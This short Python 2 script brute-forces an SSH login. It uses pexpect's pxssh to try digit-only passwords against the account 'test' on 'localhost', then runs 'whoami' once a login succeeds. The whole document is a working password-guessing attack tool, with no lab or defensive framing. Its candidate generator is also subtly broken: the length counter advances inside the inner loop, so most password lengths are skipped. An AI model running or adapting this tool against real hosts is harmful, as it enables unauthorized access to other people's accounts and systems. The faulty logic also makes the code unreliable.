from string import digits
from itertools import product
import string, itertools, time
from pexpect import pxssh
import getpass
hostname = 'localhost'
username = 'test'
characters = digits

def iter_all_strings():
    length = 0
    while True:
        for s in itertools.product(characters, repeat=length):
            yield ''.join((s))
            length +=1

for password in iter_all_strings():
	try:
		s = pxssh.pxssh()
		s.login (hostname, username, password)
		s.sendline('whoami')
		s.prompt()
		print s.before
		s.logout()
		break;
	except pxssh.ExceptionPxssh, e:
		print "pxssh failed on login."
		print str(e)
    